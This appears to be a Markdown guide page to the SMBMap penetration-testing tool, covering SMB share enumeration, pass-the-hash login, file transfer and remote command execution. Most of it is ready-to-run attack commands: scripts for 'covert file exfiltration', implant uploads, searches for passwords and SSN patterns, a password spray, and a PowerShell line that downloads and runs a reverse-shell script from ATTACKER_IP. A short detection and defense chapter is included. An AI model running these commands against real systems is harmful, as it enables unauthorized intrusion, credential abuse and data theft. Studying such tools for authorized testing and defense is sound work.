---
tool_name: "smbmap"
display_name: "SMBMap"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install smbmap"
version: "1.10.7"
github_repo: "https://github.com/ShawnDEvans/smbmap"
kali_tools_page: "https://www.kali.org/tools/smbmap/"
difficulty_level: "beginner-to-intermediate"
requires_root: false
gui_available: false
tags: ["smb", "enumeration", "pass-the-hash", "file-share", "lateral-movement", "samba"]
related_tools: ["netexec", "impacket", "enum4linux", "crackmapexec"]
---

# SMBMap

## Chapter 1: Introduction & Overview

### What is SMBMap?

SMBMap is a Python-based SMB enumeration tool that allows users to enumerate Samba share drives across an entire domain. It lists share drives, drive permissions, share contents, supports file upload/download, filename pattern matching with auto-download, and remote command execution. SMBMap supports Pass-the-Hash authentication, making it invaluable for post-exploitation lateral movement.

### History & Background

- **Created:** Shawn Evans (ShawnDEvans)
- **Maintained:** ShawnDEvans
- **License:** GPL-3.0
- **Language:** Python 3
- **Dependencies:** impacket, pyasn1, termcolor

### When to Use This Tool

- **Penetration testing:** Enumerate SMB shares and search for sensitive data
- **Post-exploitation:** Browse, upload, download files on compromised hosts
- **Red teaming:** Covert file exfiltration via SMB
- **Active Directory:** Discover and access network file shares
- **CTF challenges:** Find flags in SMB shares

### Key Concepts

- **SMB (Server Message Block):** Protocol for file sharing, printing, and inter-process communication
- **Samba:** Open-source SMB implementation for Linux/Unix
- **Share:** A shared directory accessible via SMB (e.g., C$, ADMIN$, IPC$)
- **NTLM Hash:** Hash used for NTLM authentication; accepted as credential input
- **Pass-the-Hash:** Authentication using NTLM hash instead of plaintext password

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Kali Linux or any Python 3 system
- **Python:** 3.6+
- **Privileges:** User-level (root for file content search)

### Installation

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install smbmap
```

#### Method 2: Pip

```bash
pip3 install smbmap
```

#### Method 3: From Source

```bash
git clone https://github.com/ShawnDEvans/smbmap.git
cd smbmap
pip3 install .
```

### Verification

```bash
smbmap --version
```

---

## Chapter 3: Basic Usage

### First Scan

```bash
smbmap -H 192.168.1.10
```
**Explanation:** Null session scan — enumerates shares without authentication.

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123
```
**Explanation:** Authenticated scan — shows share permissions for the user.

### Essential Commands

#### List Shares with Permissions

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123
```
**Explanation:** Lists all shares and the user's access level (READ, WRITE, NO ACCESS).

#### List All Drives

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -L
```
**Explanation:** Lists local and network drives on the target (requires admin).

#### Recursive Listing

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r
```
**Explanation:** Recursively lists all files across all shares.

#### Specific Share Listing

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -s C$
```
**Explanation:** Lists contents of the C$ admin share.

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r 'Users/Administrator/Desktop'
```
**Explanation:** Lists contents of a specific path within a share.

### Pass-the-Hash Authentication

```bash
smbmap -H 192.168.1.10 -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291'
```
**Explanation:** Authenticate using NTLM hash (LM:NT format). No plaintext password required.

---

## Chapter 4: Intermediate Usage

### File Operations

#### Download File

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 --download 'C$\temp\passwords.txt'
```
**Explanation:** Downloads a specific file from the target.

#### Upload File

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 --upload /tmp/payload.exe 'C$\temp\payload.exe'
```
**Explanation:** Uploads a file to the target share.

#### Delete File

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 --delete 'C$\temp\evidence.txt' --skip
```
**Explanation:** Deletes a remote file. `--skip` bypasses confirmation prompt.

### Pattern-Based File Search

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r 'C$\Users' -A '(password|config|secret)'
```
**Explanation:** Searches for files matching regex pattern and auto-downloads matches.

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r 'C$\inetpub' -A '\.(config|xml|bak)$'
```
**Explanation:** Searches for .config, .xml, and .bak files.

### Depth-Controlled Listing

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r 'C$\Program Files' --depth 3
```
**Explanation:** Lists directory tree to a specific depth (3 levels deep).

### File Content Search

```bash
sudo smbmap -H 192.168.1.10 -u administrator -p Password123 -F 'password|secret|confidential'
```
**Explanation:** Searches file contents for patterns (requires root, admin access, PowerShell on target).

```bash
sudo smbmap -H 192.168.1.10 -u administrator -p Password123 -F '\d{3}-\d{2}-\d{4}' --search-path 'D:\HR'
```
**Explanation:** Searches for SSN-pattern data in specific directory.

### Output Formats

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -g /tmp/grep_output.txt
```
**Explanation:** Outputs in grep-friendly format.

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 --csv /tmp/shares.csv
```
**Explanation:** Outputs in CSV format.

---

## Chapter 5: Advanced Usage

### Network-Wide Enumeration

```bash
smbmap --host-file /tmp/targets.txt -u administrator -p Password123
```
**Explanation:** Enumerates SMB shares across all hosts listed in file.

```bash
smbmap --host-file /tmp/targets.txt -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:hash'
```
**Explanation:** Network-wide scan using Pass-the-Hash.

### SMB Signing Detection

```bash
smbmap --host-file /tmp/targets.txt --signing
```
**Explanation:** Checks SMB signing status across all hosts. Identifies hosts vulnerable to NTLM relay.

### Version Detection

```bash
smbmap --host-file /tmp/targets.txt -v
```
**Explanation:** Returns OS version information for each SMB host.

### Remote Command Execution

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -x 'whoami'
```
**Explanation:** Executes a command on the target via WMI (default execution method).

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -x 'ipconfig /all' --mode psexec
```
**Explanation:** Executes command using PsExec method instead of WMI.

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -x 'net group "Domain Admins" /domain'
```
**Explanation:** Enumerates Domain Admins group via remote execution.

### Kerberos Authentication

```bash
smbmap -H 192.168.1.10 -u administrator -k --no-pass --dc-ip dc01.target.example.com
```
**Explanation:** Uses Kerberos authentication with ccache file (export KRB5CCNAME first).

### Domain Enumeration

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -d target.example.com -r 'Users' --depth 2
```
**Explanation:** Domain-authenticated recursive listing of user profiles.

### Exclude Shares

```bash
smbmap -H 192.168.1.10 -u administrator -p Password123 -r --exclude 'ADMIN$' 'IPC$' 'print$'
```
**Explanation:** Excludes administrative shares from enumeration.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Find flag in SMB share

**Steps:**
```bash
# 1. Enumerate shares
smbmap -H 192.168.1.10 -u administrator -p Password123

# 2. List share contents
smbmap -H 192.168.1.10 -u administrator -p Password123 -r 'ShareName'

# 3. Search for flag files
smbmap -H 192.168.1.10 -u administrator -p Password123 -r -A 'flag|proof'

# 4. Download flag
smbmap -H 192.168.1.10 -u administrator -p Password123 --download 'ShareName\flag.txt'
```

### Scenario 2: Penetration Test

**Objective:** Find sensitive data across network

**Steps:**
```bash
# 1. Create target list
echo "192.168.1.10" > targets.txt
echo "192.168.1.11" >> targets.txt
echo "192.168.1.12" >> targets.txt

# 2. Scan all targets
smbmap --host-file targets.txt -u administrator -p 'aad3b435b51404eeaad3b435b51404ee:hash'

# 3. Search for sensitive files
smbmap --host-file targets.txt -u administrator -p Password123 -r -A '(password|backup|confidential|secret)'

# 4. Search file contents
sudo smbmap --host-file targets.txt -u administrator -p Password123 -F 'password\s*='

# 5. Download found files
smbmap -H 192.168.1.10 -u administrator -p Password123 --download 'C$\temp\backup.sql'
```

### Scenario 3: Red Team Operation

**Objective:** Covert file exfiltration

**Steps:**
```bash
# 1. Stealthy enumeration
smbmap -H 192.168.1.10 -u standard_user -p Password123 --no-banner -q

# 2. Search specific directories
smbmap -H 192.168.1.10 -u standard_user -p Password123 -r 'Shared Documents' --depth 2

# 3. Download sensitive files
smbmap -H 192.168.1.10 -u standard_user -p Password123 --download 'Shared Documents\financial_report.xlsx'

# 4. Upload tools if needed
smbmap -H 192.168.1.10 -u standard_user -p Password123 --upload /tmp/implant.exe 'Shared Documents\implant.exe'
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect SMBMap

#### Network Indicators

```
# Multiple SMB connections from single source
# SMB share enumeration pattern (listing all shares)
# Recursive directory listing across shares
# SMB version queries
# Unusual SMB traffic patterns
```

#### Log Analysis

```bash
# Windows Event Logs
# Event ID 5140 - Network share accessed
# Event ID 5145 - Network share check (permission check)
# Event ID 4624 - Logon Type 3 (Network)
# Event ID 4625 - Failed logon attempts
```

### Mitigation Strategies

```bash
# Disable unnecessary shares
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f

# Enable SMB signing
# GPO: Microsoft network server: Digitally sign communications (always)

# Implement least-privilege share permissions
# Use separate accounts for admin vs user access
```

### Blue Team Response

1. **Disable default shares** — Remove ADMIN$, C$ where not needed
2. **Enable SMB signing** — Prevent relay attacks
3. **Monitor Event 5140** — Track share access patterns
4. **Implement least-privilege** — Users only access needed shares
5. **Use separate admin accounts** — Never use domain admin for regular access
6. **Deploy honeypot shares** — Detect unauthorized enumeration

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "Connection refused"

**Cause:** SMB service not running or port blocked

**Solution:**
```bash
nmap -p 445,139 192.168.1.10
# Verify SMB is running
```

#### Error: "Access denied"

**Cause:** Invalid credentials or insufficient permissions

**Solution:**
```bash
# Try null session
smbmap -H 192.168.1.10

# Try different credentials
smbmap -H 192.168.1.10 -u different_user -p password
```

#### Error: "STATUS_USER_SESSION_DELETED"

**Cause:** Session expired or timeout

**Solution:**
```bash
# Re-authenticate
smbmap -H 192.168.1.10 -u admin -p pass
```

### Advanced Scenarios

#### Multi-Host Data Exfiltration

```bash
#!/bin/bash
# Automated sensitive file discovery across network
TARGETS="192.168.1.10 192.168.1.11 192.168.1.12"
CREDS="-u administrator -p Password123"

for target in $TARGETS; do
    echo "[*] Scanning $target"
    smbmap -H $target $CREDS -r 'C$\Users' --depth 2 -A '(password|secret|backup|config)' -q
done
```
**Explanation:** Discovers sensitive files across multiple hosts automatically.

#### Share Permission Mapping

```bash
#!/bin/bash
# Map all share permissions across network
for ip in $(seq 1 254); do
    smbmap -H 192.168.1.$ip -u guest -p '' --no-color 2>/dev/null | grep -E "(READ|WRITE)" >> permissions_map.txt
done
```
**Explanation:** Maps guest-accessible share permissions across entire subnet.

#### Steganography File Discovery

```bash
# Search for large images that could contain hidden data
smbmap -H 192.168.1.10 -u admin -p pass -r 'C$\Users' -A '\.(jpg|jpeg|bmp|wav|png)$' -q
```
**Explanation:** Finds image and audio files that might contain steganographic data.

#### Automated Share Backup

```bash
#!/bin/bash
# Backup all accessible shares
smbmap -H 192.168.1.10 -u admin -p pass -r 'SharedDocs' -g /tmp/filelist.txt
while read -r file; do
    smbmap -H 192.168.1.10 -u admin -p pass --download "SharedDocs/$file"
done < /tmp/filelist.txt
```
**Explanation:** Downloads all files from a share for backup or exfiltration.

#### Integration with Metasploit

```bash
# After msfconsole exploit, use smbmap for enumeration
smbmap -H $RHOSTS -u $SMBUser -p $SMBPass -r 'C$' --depth 3 -q
```
**Explanation:** Post-exploitation enumeration using credentials from Metasploit.

#### Kerberos Ccache Workflow

```bash
# Export ticket from rubeus/mimikatz
# Save as /tmp/admin.ccache

export KRB5CCNAME=/tmp/admin.ccache
smbmap -H 192.168.1.10 -u administrator -k --no-pass --dc-ip dc01.target.example.com
```
**Explanation:** Uses Kerberos ticket for SMB authentication without password.

#### Custom SMB Port

```bash
smbmap -H 192.168.1.10 -P 445 -u admin -p pass
smbmap -H 192.168.1.10 -P 139 -u admin -p pass
```
**Explanation:** Tests different SMB ports.

#### Exclude and Filter Combinations

```bash
smbmap -H 192.168.1.10 -u admin -p pass -r --exclude 'ADMIN$' 'IPC$' 'print$' -A '\.(docx|xlsx|pdf)$' -q
```
**Explanation:** Searches for office documents while excluding admin shares.

#### CSV Export for Reporting

```bash
smbmap -H 192.168.1.0/24 -u admin -p pass --csv /tmp/smb_report.csv --no-banner
```
**Explanation:** Generates CSV report for management or documentation.

#### Quiet Mode for Stealth

```bash
smbmap -H 192.168.1.10 -u admin -p pass -q -r 'C$\temp'
```
**Explanation:** Quiet output showing only accessible shares and files.

#### Depth-Controlled Search

```bash
smbmap -H 192.168.1.10 -u admin -p pass -r 'C$\inetpub\wwwroot' --depth 4 -A '\.(config|xml|csproj|sln)$'
```
**Explanation:** Searches web application directories for configuration files.

#### Password Spray via SMBMap

```bash
#!/bin/bash
USERS="admin administrator root backup"
PASS="Password123"
TARGET="192.168.1.0/24"

for user in $USERS; do
    result=$(smbmap -H $TARGET -u $user -p $PASS --no-banner 2>/dev/null)
    if echo "$result" | grep -q "READ\|WRITE"; then
        echo "[+] Valid: $user:$PASS on $TARGET"
    fi
done
```
**Explanation:** Basic password spray using SMBMap.

#### PowerShell Reverse Shell via SMBMap

```bash
smbmap -H 192.168.1.10 -u admin -p pass -x 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')"'
```
**Explanation:** Executes PowerShell reverse shell via SMB command execution.

### FAQ

**Q: Is smbmap legal to use?**
A: Yes, as an authorized penetration testing tool. Unauthorized access to computer systems is illegal.

**Q: Can smbmap crack passwords?**
A: No, smbmap is an enumeration tool. Use hashcat or john for password cracking.

**Q: What's the difference between smbmap and netexec?**
A: smbmap focuses on file share enumeration and file operations. netexec is broader, covering multiple protocols and command execution.

**Q: Does smbmap support Kerberos?**
A: Yes, via the `-k` flag with ccache authentication.

**Q: Can smbmap execute PowerShell?**
A: Yes, use `-X` flag for PowerShell commands and `-x` for cmd commands.

**Q: What execution methods does smbmap support?**
A: SMBMap supports WMI (default) and PsExec methods via `--mode` flag.

---

## Resources

### Official Documentation

- [SMBMap GitHub](https://github.com/ShawnDEvans/smbmap)
- [Kali Linux SMBMap](https://www.kali.org/tools/smbmap/)

### Tutorials

- [HackTricks - SMB Enumeration](https://book.hacktricks.xyz/network-services-pentesting/smb-samba)
- [PayloadsAllTheThings - SMB](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pentesting.md)

### Related Tools

- **netexec:** Multi-protocol network tool
- **enum4linux:** SMB enumeration
- **impacket:** Python SMB client
- **smbclient:** Samba SMB client

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
